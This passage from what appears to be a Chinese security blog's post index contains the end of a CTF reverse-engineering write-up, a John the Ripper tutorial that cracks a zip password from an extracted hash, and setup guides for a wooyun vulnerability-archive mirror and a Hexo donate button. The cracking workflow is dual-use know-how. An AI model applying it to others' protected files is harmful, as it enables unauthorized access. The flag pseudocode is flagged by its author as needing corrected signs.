__int16)(*(_BYTE *)(*(_DWORD *)(*(_DWORD *)(a1 + 8) + 20) + i) ^ (unsigned __int16)((signed int)*(_BYTE *)(i + v3) &gt;&gt; 4))</span><br><span class="line">       - i !&#x3D; *(_DWORD *)(*(_DWORD *)(*(_DWORD *)(a1 + 4) + 4) + 4 * i) )</span><br><span class="line">    &#123;</span><br><span class="line">      (*(void (__cdecl **)(_DWORD))(*(_DWORD *)a1 + 12))(*(_DWORD *)(*(_DWORD *)(a1 + 8) + 16));</span><br><span class="line">      v2 &#x3D; *(_DWORD *)(*(_DWORD *)(a1 + 8) + 16);</span><br><span class="line">      (*(void (__stdcall **)(_DWORD))(*(_DWORD *)a1 + 12))(0);</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    result &#x3D; (*(int (__cdecl **)(_DWORD))(*(_DWORD *)a1 + 12))(*(_DWORD *)(*(_DWORD *)(a1 + 8) + 20));</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">按上述算法抠出对应的四个table即可，伪代码如下：</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">for i in range(15):</span><br><span class="line">flag_tmp1 &#x3D; (table1[i] ^ (table2[i]-i)) % 16</span><br><span class="line">flag_tmp2 &#x3D; (table3[i] ^ (table3[i]+i)) %16</span><br><span class="line">flag +&#x3D; (flag_tmp1*16 + flag_tmp2)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-indirect_1.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-indirect_1.png"></a></p><p>坑爹的出题人。。 + 号 -号要换个位置才能得出可见字符</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-indirect_2.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-xnuca-indirect_2.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nuca </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>John 破解rar 或者 zip密码</title>
      <link href="John-the-Ripper-password-cracker.html"/>
      <url>John-the-Ripper-password-cracker.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><blockquote><p><a href="http://www.openwall.com/john/">win环境</a><br> Ubuntu</p></blockquote><h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential libssl-dev</span><br></pre></td></tr></table></figure><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><h3 id="创建临时目录用来编译源代码"><a href="#创建临时目录用来编译源代码" class="headerlink" title="创建临时目录用来编译源代码"></a>创建临时目录用来编译源代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir temp</span><br></pre></td></tr></table></figure><h3 id="改变工作目录"><a href="#改变工作目录" class="headerlink" title="改变工作目录"></a>改变工作目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd temp</span><br></pre></td></tr></table></figure><h3 id="从官网下载源代码"><a href="#从官网下载源代码" class="headerlink" title="从官网下载源代码"></a>从官网下载源代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;www.openwall.com&#x2F;john&#x2F;j&#x2F;john-1.8.0-jumbo-1.tar.gz</span><br></pre></td></tr></table></figure><h3 id="解压缩"><a href="#解压缩" class="headerlink" title="解压缩"></a>解压缩</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar xfz john-1.8.0-jumbo-1.tar.gz</span><br></pre></td></tr></table></figure><h3 id="配置脚本"><a href="#配置脚本" class="headerlink" title="配置脚本"></a>配置脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd john-1.8.0-jumbo-1&#x2F;src&#x2F;</span><br><span class="line"></span><br><span class="line"> .&#x2F;configure</span><br></pre></td></tr></table></figure><h3 id="编译-1"><a href="#编译-1" class="headerlink" title="编译"></a>编译</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -s</span><br></pre></td></tr></table></figure><h3 id="编译可以运行目录"><a href="#编译可以运行目录" class="headerlink" title="编译可以运行目录"></a>编译可以运行目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ..&#x2F;run</span><br></pre></td></tr></table></figure><p>可以从目录直接执行命令</p><h2 id="简单安装"><a href="#简单安装" class="headerlink" title="简单安装"></a>简单安装</h2><h3 id="目录创建"><a href="#目录创建" class="headerlink" title="目录创建"></a>目录创建</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ~&#x2F;apps&#x2F;john</span><br></pre></td></tr></table></figure><h3 id="复制程序到目录"><a href="#复制程序到目录" class="headerlink" title="复制程序到目录"></a>复制程序到目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ~&#x2F;temp&#x2F;john-1.8.0-jumbo-1&#x2F;run&#x2F;* ~&#x2F;apps&#x2F;john&#x2F;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~&#x2F;apps&#x2F;john&#x2F; &amp;&amp; .&#x2F;john --test</span><br></pre></td></tr></table></figure><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>我这里window环境做演示<br>首先我手头有一个 <code>test.zip</code> 压缩包密码是 <code>123</code></p><h2 id="用zip2john或者rar2john提取hash密码"><a href="#用zip2john或者rar2john提取hash密码" class="headerlink" title="用zip2john或者rar2john提取hash密码"></a>用zip2john或者rar2john提取hash密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip2john.exe test.zip &gt; zip.hashes</span><br></pre></td></tr></table></figure><p><a href="http://oayoilchh.bkt.clouddn.com/1.png" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/1.png"></a></p><h2 id="john破解hash密码"><a href="#john破解hash密码" class="headerlink" title="john破解hash密码"></a>john破解hash密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john zip.hashes</span><br></pre></td></tr></table></figure><p>结果应该是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Loaded 1 password hash (PKZIP [32&#x2F;64])</span><br><span class="line"></span><br><span class="line">guesses: 0  time: 0:00:40:29 0.00% (3)  c&#x2F;s: 2278K  trying: eDTvw - ekTsl</span><br><span class="line">guesses: 0  time: 0:01:25:10 0.00% (3)  c&#x2F;s: 1248K  trying: ctshm#ni - ctshfon9</span><br><span class="line">guesses: 0  time: 0:02:56:40 0.00% (3)  c&#x2F;s: 1499K  trying: BR489a - BR48jf</span><br><span class="line">guesses: 0  time: 0:03:56:04 0.00% (3)  c&#x2F;s: 1703K  trying: fjmis5od - fjmidia0</span><br><span class="line">guesses: 0  time: 0:04:46:09 0.00% (3)  c&#x2F;s: 1748K  trying: Difg1ek - DifgbpS</span><br><span class="line">guesses: 0  time: 0:05:21:22 0.00% (3)  c&#x2F;s: 1855K  trying: btkululp - btkulene</span><br><span class="line">guesses: 0  time: 0:06:02:43 0.00% (3)  c&#x2F;s: 1857K  trying: ghmnymik - ghmnyasd</span><br><span class="line">test4321         (..&#x2F;test.zip)</span><br><span class="line">guesses: 1  time: 0:06:32:34 DONE (Mon Jul 28 17:50:22 2014)  c&#x2F;s: 1895K  trying: telkuwhy – test43ac</span><br></pre></td></tr></table></figure><p>如果要看到密码可以用下面的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john zip.hashes --show</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/john-ripper-password-cracker-01.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/john-ripper-password-cracker-01.png"></a></p><h1 id="其他链接"><a href="#其他链接" class="headerlink" title="其他链接"></a>其他链接</h1><p><a href="https://blog.sleeplessbeastie.eu/2015/05/25/how-to-crack-archive-password-faster/">https://blog.sleeplessbeastie.eu/2015/05/25/how-to-crack-archive-password-faster/</a><br><a href="http://www.cybercrimetech.com/2014/07/how-to-cracking-zip-and-rar-protected.html">http://www.cybercrimetech.com/2014/07/how-to-cracking-zip-and-rar-protected.html</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> John </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次在服务器上wooyun搜索站的搭建</title>
      <link href="build-the-wooyun-drops.html"/>
      <url>build-the-wooyun-drops.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>首先必须要感谢一下 <code>hancool</code>大哥的帮忙阿<del>~</del> 至少帮我解决了不少麻烦</p><h1 id="wooyun-pulic"><a href="#wooyun-pulic" class="headerlink" title="wooyun_pulic"></a>wooyun_pulic</h1><p><strong>wooyun公开漏洞以及知识库和搜索</strong></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/home_wooyun.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/home_wooyun.png"></a></p><h1 id="依赖组件"><a href="#依赖组件" class="headerlink" title="依赖组件"></a>依赖组件</h1><blockquote><p>python2.7和pip<br>mongodb<br>scrapy<br>flask 或者tornado( 个人建议用tornado 这个比较稳定 有能力的人可以自己写一下)<br>pymongo<br>Elasticsearch(搜索引擎，可选)</p></blockquote><h1 id="ubuntu下安装"><a href="#ubuntu下安装" class="headerlink" title="ubuntu下安装"></a>ubuntu下安装</h1><h2 id="1、安装python、pip、mongodb"><a href="#1、安装python、pip、mongodb" class="headerlink" title="1、安装python、pip、mongodb"></a>1、安装python、pip、mongodb</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python python-pip mongodb</span><br></pre></td></tr></table></figure><h2 id="2、安装scrapy"><a href="#2、安装scrapy" class="headerlink" title="2、安装scrapy"></a>2、安装scrapy</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">安装scrapy如果报错，则先apt-get安装下述依赖包，然后安装pip安装lxml后即可正常安装scrapy</span><br><span class="line">sudo apt-get install libxml2-dev libxslt1-dev python-dev zlib1g-dev libevent-dev python-openssl</span><br><span class="line"></span><br><span class="line">sudo pip install lxml</span><br><span class="line">sudo pip install scrapy</span><br></pre></td></tr></table></figure><h2 id="3、安装pymongo和flask（或tornado）"><a href="#3、安装pymongo和flask（或tornado）" class="headerlink" title="3、安装pymongo和flask（或tornado）"></a>3、安装pymongo和flask（或tornado）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install flask pymongo</span><br><span class="line">(sudo pip install tornado)</span><br></pre></td></tr></table></figure><h2 id="4、从github下载源码"><a href="#4、从github下载源码" class="headerlink" title="4、从github下载源码"></a>4、从github下载源码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;hanc00l&#x2F;wooyun_public</span><br></pre></td></tr></table></figure><h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1><p>鉴于wooyun已经关了 其实这里的爬虫已经没有用了~ 所以详细步骤就不写了</p><h1 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h1><blockquote><p>漏洞搜索使用了Flask作为web server，bootstrap作为前端（8.12增加tornador web server，可配合nginx反向代理，支持高并发的应用）<br>启动web server ：在flask目录下运行./app.py，默认端口是5000<br>启动Elassticsearch（如果已配置了Elasticsearch）：在elasticsearch-2.3.4/bin目录下运行./elasticsearch -d (-d表示以后台方式运行）<br>搜索：在浏览器通过<a href="http://localhost:5000进行搜索漏洞，多个关键字可以用空格分开。">http://localhost:5000进行搜索漏洞，多个关键字可以用空格分开。</a><br>默认使用mongodb的数据库搜索，在进行全文搜索时比较慢，推荐安装使用Elasicsearch搜索引擎。</p></blockquote><h1 id="安装和配置Elasicsearch的方法（点我）"><a href="#安装和配置Elasicsearch的方法（点我）" class="headerlink" title="安装和配置Elasicsearch的方法（点我）"></a>安装和配置Elasicsearch的方法（点我）</h1><h2 id="安装elasticsearch"><a href="#安装elasticsearch" class="headerlink" title="安装elasticsearch"></a>安装elasticsearch</h2><h3 id="1、安装JDK（或者JRE）"><a href="#1、安装JDK（或者JRE）" class="headerlink" title="1、安装JDK（或者JRE）"></a>1、安装JDK（或者JRE）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install openjdk-7-jdk</span><br></pre></td></tr></table></figure><h3 id="2、下载elasticseach"><a href="#2、下载elasticseach" class="headerlink" title="2、下载elasticseach"></a>2、下载elasticseach</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;download.elastic.co&#x2F;elasticsearch&#x2F;release&#x2F;org&#x2F;elasticsearch&#x2F;distribution&#x2F;tar&#x2F;elasticsearch&#x2F;2.3.4&#x2F;elasticsearch-2.3.4.tar.gz</span><br><span class="line">tar xvf elasticsearch-2.3.4.tar.gz</span><br></pre></td></tr></table></figure><h3 id="3、运行elasticsearch"><a href="#3、运行elasticsearch" class="headerlink" title="3、运行elasticsearch"></a>3、运行elasticsearch</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd elasticsearch-2.3.4&#x2F;bin</span><br><span class="line">.&#x2F;elasticsearch</span><br></pre></td></tr></table></figure><h3 id="4、测试一下，安装完成运行后elasticsearch会在9200端口上进行监听"><a href="#4、测试一下，安装完成运行后elasticsearch会在9200端口上进行监听" class="headerlink" title="4、测试一下，安装完成运行后elasticsearch会在9200端口上进行监听"></a>4、测试一下，安装完成运行后elasticsearch会在9200端口上进行监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET http:&#x2F;&#x2F;localhost:9200</span><br><span class="line">&#123;</span><br><span class="line">  &quot;name&quot; : &quot;Sebastian Shaw&quot;,</span><br><span class="line">  &quot;cluster_name&quot; : &quot;elasticsearch&quot;,</span><br><span class="line">  &quot;version&quot; : &#123;</span><br><span class="line">    &quot;number&quot; : &quot;2.3.4&quot;,</span><br><span class="line">    &quot;build_hash&quot; : &quot;e455fd0c13dceca8dbbdbb1665d068ae55dabe3f&quot;,</span><br><span class="line">    &quot;build_timestamp&quot; : &quot;2016-06-30T11:24:31Z&quot;,</span><br><span class="line">    &quot;build_snapshot&quot; : false,</span><br><span class="line">    &quot;lucene_version&quot; : &quot;5.5.0&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;tagline&quot; : &quot;You Know, for Search&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="配置mongodb"><a href="#配置mongodb" class="headerlink" title="配置mongodb"></a>配置mongodb</h2><h3 id="1、编辑-etc-mongodb-conf，增加："><a href="#1、编辑-etc-mongodb-conf，增加：" class="headerlink" title="1、编辑/etc/mongodb.conf，增加："></a>1、编辑/etc/mongodb.conf，增加：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">replSet&#x3D;rs0 #这里是指定replSet的名字 </span><br><span class="line">oplogSize&#x3D;100 #这里是指定oplog表数据大小（太大了不支持）</span><br></pre></td></tr></table></figure><p><code>重启动mongodb</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service mongodb restart</span><br></pre></td></tr></table></figure><h3 id="2，进入mongodb-shell，初始化replicSet"><a href="#2，进入mongodb-shell，初始化replicSet" class="headerlink" title="2，进入mongodb shell，初始化replicSet"></a>2，进入mongodb shell，初始化replicSet</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mongo</span><br><span class="line">rs.initiate( &#123;&quot;_id&quot; : &quot;rs0&quot;, &quot;version&quot; : 1, &quot;members&quot; : [ &#123; &quot;_id&quot; : 0, &quot;host&quot; : &quot;127.0.0.1:27017&quot; &#125; ]&#125;) </span><br></pre></td></tr></table></figure><h3 id="3，搭建好replicSet之后，退出mongo-shell重新登录，提示符会变成：rs0-PRIMARY-gt-，就可以退出Mongodb"><a href="#3，搭建好replicSet之后，退出mongo-shell重新登录，提示符会变成：rs0-PRIMARY-gt-，就可以退出Mongodb" class="headerlink" title="3，搭建好replicSet之后，退出mongo shell重新登录，提示符会变成：rs0:PRIMARY&gt;，就可以退出Mongodb"></a>3，搭建好replicSet之后，退出mongo shell重新登录，提示符会变成：rs0:PRIMARY&gt;，就可以退出Mongodb</h3><h2 id="安装中文分词插件elasticsearch-analysis-ik"><a href="#安装中文分词插件elasticsearch-analysis-ik" class="headerlink" title="安装中文分词插件elasticsearch-analysis-ik"></a>安装中文分词插件elasticsearch-analysis-ik</h2><h3 id="1、从github下载编译好好的插件"><a href="#1、从github下载编译好好的插件" class="headerlink" title="1、从github下载编译好好的插件"></a>1、从github下载编译好好的插件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd ~  </span><br><span class="line">sudo apt-get install unzip</span><br><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;medcl&#x2F;elasticsearch-analysis-ik&#x2F;releases&#x2F;download&#x2F;v1.9.4&#x2F;elasticsearch-analysis-ik-1.9.4.zip</span><br><span class="line">unzip elasticsearch-analysis-ik-1.9.4.zip</span><br></pre></td></tr></table></figure><h3 id="2、将插件复制到elasticsearch的plugins目录"><a href="#2、将插件复制到elasticsearch的plugins目录" class="headerlink" title="2、将插件复制到elasticsearch的plugins目录"></a>2、将插件复制到elasticsearch的plugins目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -r elasticsearch-analysis-ik elasticsearch-2.3.4&#x2F;plugins</span><br></pre></td></tr></table></figure><h3 id="3、修改elasticsearch-yml配置，定义插件配置"><a href="#3、修改elasticsearch-yml配置，定义插件配置" class="headerlink" title="3、修改elasticsearch.yml配置，定义插件配置"></a>3、修改elasticsearch.yml配置，定义插件配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi elasticsearch-2.3.4&#x2F;config&#x2F;elasticsearch.yml</span><br></pre></td></tr></table></figure><p><strong>在最后增加:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.analysis.analyzer.ik.type : &#39;ik&#39;</span><br><span class="line">index.analysis.analyzer.default.type : &#39;ik&#39;</span><br></pre></td></tr></table></figure><h3 id="4、退出并重启elasticsearch"><a href="#4、退出并重启elasticsearch" class="headerlink" title="4、退出并重启elasticsearch"></a>4、退出并重启elasticsearch</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elasticsearch-2.3.4&#x2F;bin&#x2F;elasticsearch -d</span><br><span class="line"> (-d表示以后台方式运行）</span><br></pre></td></tr></table></figure><h2 id="安装mongo-connector，将数据同步到elasticsearch"><a href="#安装mongo-connector，将数据同步到elasticsearch" class="headerlink" title="安装mongo-connector，将数据同步到elasticsearch"></a>安装mongo-connector，将数据同步到elasticsearch</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install mongo-connector elastic2_doc_manager</span><br><span class="line">sudo mongo-connector -m localhost:27017 -t localhost:9200 -d elastic2_doc_manager</span><br></pre></td></tr></table></figure><p>显示Logging to mongo-connector.log.后将会把mongodb数据库的信息同步到elasticsearch中，完全同步完成估计需要30分钟左右，同步期间不能中断，否则可能导致elasticsearch与mongodb数据不一致。</p><p>在同步过程中，可能会报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">OperationFailed: ConnectionTimeout caused by - ReadTimeoutError(HTTPConnectionPool(host&#x3D;u&#39;localhost&#39;, port&#x3D;9200): Read timed out. (read timeout&#x3D;10))</span><br><span class="line">2016-08-04 17:24:53,372 [ERROR] mongo_connector.oplog_manager:633 - OplogThread: Failed during dump collection cannot recover! Collection(Database(MongoClient(u&#39;127.0.0.1&#39;, 27017), u&#39;local&#39;), u&#39;oplog.rs&#39;)</span><br><span class="line">2016-08-04 17:24:54,371 [ERROR] mongo_connector.connector:304 - MongoConnector: OplogThread &lt;OplogThread(Thread-7, started 140485117060864)&gt; unexpectedly stopped! Shutting down</span><br></pre></td></tr></table></figure><p><strong>解决办法:</strong><br>修改timeout值，从默认的10改为200</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vi &#x2F;usr&#x2F;local&#x2F;lib&#x2F;python2.7&#x2F;dist-packages&#x2F;mongo_connector&#x2F;doc_managers&#x2F;elastic2_doc_manager.py</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">将：</span><br><span class="line">self.elastic &#x3D; Elasticsearch(hosts&#x3D;[url],**kwargs.get(&#39;clientOptions&#39;, &#123;&#125;))</span><br><span class="line"></span><br><span class="line">修改为：</span><br><span class="line">self.elastic &#x3D; Elasticsearch(hosts&#x3D;[url],timeout&#x3D;200, **kwargs.get(&#39;clientOptions&#39;, &#123;&#125;))</span><br></pre></td></tr></table></figure><h2 id="启用全文搜索"><a href="#启用全文搜索" class="headerlink" title="启用全文搜索"></a>启用全文搜索</h2><h3 id="1、安装elasticsearch-py"><a href="#1、安装elasticsearch-py" class="headerlink" title="1、安装elasticsearch-py"></a>1、安装elasticsearch-py</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install elasticsearch</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2、更新app-py"><a href="#2、更新app-py" class="headerlink" title="2、更新app.py"></a>2、更新app.py</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~&#x2F;wooyun_public</span><br><span class="line">git pull</span><br></pre></td></tr></table></figure><h3 id="3、修改app-py"><a href="#3、修改app-py" class="headerlink" title="3、修改app.py"></a>3、修改app.py</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi ~&#x2F;wooyun_public&#x2F;flask&#x2F;app.py</span><br><span class="line">修改:</span><br><span class="line">    SEARCH_BY_ES &#x3D; &#39;auto&#39;</span><br></pre></td></tr></table></figure><h1 id="为mongodb数据库创建索引"><a href="#为mongodb数据库创建索引" class="headerlink" title="为mongodb数据库创建索引"></a>为mongodb数据库创建索引</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mongo</span><br><span class="line">use wooyun</span><br><span class="line">db.wooyun_list.ensureIndex(&#123;&quot;datetime&quot;:1&#125;)</span><br><span class="line">db.wooyun_drops.ensureIndex(&#123;&quot;datetime&quot;:1&#125;)</span><br></pre></td></tr></table></figure><h1 id="Push内容"><a href="#Push内容" class="headerlink" title="Push内容"></a>Push内容</h1><p>一共有两部分内容，一份内容在<code> wooyun_public/flask/static</code><br>就是statci整个文件包含了大部分内容<br>还有一份内容在<code>mongodb</code>数据库里面~ 需要打包下来<br>打包命令是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongodump -h 127.0.0.1 -o &#x2F;home&#x2F;wooyun&#x2F;mongodb&#x2F;</span><br></pre></td></tr></table></figure><p>后面的地址是保存路径<br>还原数据库命令是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongorestore   &#x2F;home&#x2F;wooyun&#x2F;mongodb&#x2F;</span><br></pre></td></tr></table></figure><h1 id="虚拟机下载地址"><a href="#虚拟机下载地址" class="headerlink" title="虚拟机下载地址"></a>虚拟机下载地址</h1><p><a href="http://pan.baidu.com/s/1kVtY2rX">http://pan.baidu.com/s/1kVtY2rX </a>   提取密码：5ik7  PS:这个是<code>hancool</code>前辈做的</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>主要内容都是copy了是<code>hancool</code>前辈的的文章~<br>文章地址在github 如果想用虚拟机或者看更详细的内容 可以从去github看看<a href="https://github.com/hanc00l/wooyun_public">https://github.com/hanc00l/wooyun_public</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wooyun </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo 博客添加打赏功能</title>
      <link href="hexo-donate.html"/>
      <url>hexo-donate.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>以<code>spfk</code>主题为例子~  </p><h1 id="第一步-新增打赏模块"><a href="#第一步-新增打赏模块" class="headerlink" title="第一步:新增打赏模块"></a>第一步:新增打赏模块</h1><p><strong>layout_partial</strong>目录下 新建 <strong>donate.ejs</strong>  写上以下内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!</span> <span class="attr">--</span> 添加捐赠图标 <span 